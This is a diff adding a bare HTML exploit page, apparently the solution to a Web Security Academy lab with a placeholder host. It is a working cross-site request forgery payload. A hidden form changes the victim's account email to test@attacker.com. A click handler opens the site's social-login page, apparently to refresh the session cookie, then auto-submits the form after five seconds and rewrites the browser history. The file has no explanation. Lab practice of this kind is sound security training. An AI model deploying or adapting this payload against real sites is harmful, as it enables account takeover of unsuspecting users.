@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <form action="https://xxxxxxxxxxxxxxURLxxxxxxxxxxxxxxx.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="test@attacker.com" />
+    </form>
+    <script>
+    const submitForm = () => {
+      document.forms[0].submit();
+      history.pushState('', '', '/');
+    };
+    window.onclick = () => {
+      window.open('https://xxxxxxxxxxxxxxURLxxxxxxxxxxxxxxx.web-security-academy.net/social-login');
+      setTimeout(() => submitForm(), 5000);
+    }
+    </script>
+  </body>
+</html>
